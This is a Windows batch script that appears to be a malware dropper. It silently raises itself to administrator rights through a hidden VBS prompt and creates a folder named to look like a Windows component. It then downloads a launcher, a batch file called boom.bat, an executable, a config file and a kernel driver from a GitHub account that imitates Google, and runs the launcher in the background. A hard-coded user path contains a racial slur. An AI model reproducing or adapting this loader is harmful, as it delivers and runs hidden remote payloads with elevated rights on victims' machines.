@echo off
setlocal

:: ============================================================
:: 1. UAC ELEVATION (Runs Hidden)
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
    wscript "%temp%\admin.vbs"
    exit /b
)
if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"

:: ============================================================
:: 2. DIRECTORY SETUP
:: ============================================================
set "workDir=C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\"
if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
cd /d "%workDir%"
if not exist "driver" mkdir "driver" >nul 2>&1

:: Security Protocol Fix
set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"

:: ============================================================
:: 3. DOWNLOADS (Exact Links with Cache-Buster)
:: ============================================================

:: 1. The main Sticky Launcher (Added ?v=%RANDOM% to force update)
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs?v=%RANDOM%', 'launcher.vbs')"

:: 2. The batch file
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat?v=%RANDOM%', 'boom.bat')"

:: 3. The main EXE
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe?v=%RANDOM%', 'sigurd.exe')"

:: 4. The Config file
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml?v=%RANDOM%', 'Config.toml')"

:: 5. The Driver (Note: Corrected the folder path for the download)
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys?v=%RANDOM%', 'driver\K7RKScan.sys')"

:: ============================================================
:: 4. THE SILENT HANDOFF
:: ============================================================
if exist "launcher.vbs" (
    start "" "wscript.exe" "launcher.vbs"
)

exit
